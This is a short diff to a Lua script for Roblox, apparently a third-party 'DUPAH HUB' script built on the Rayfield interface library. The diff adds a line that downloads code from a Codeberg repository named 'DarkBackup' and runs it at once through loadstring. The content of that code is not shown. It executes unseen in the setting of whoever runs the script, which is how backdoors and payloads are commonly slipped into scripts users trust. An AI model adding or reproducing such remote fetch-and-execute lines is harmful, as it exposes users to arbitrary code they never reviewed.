@@ -7,6 +7,8 @@ local Players = game:GetService("Players")
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
+
 local Window = Rayfield:CreateWindow({
 	Name = "DUPAH HUB",
 	LoadingTitle = "DUPAH HUB",
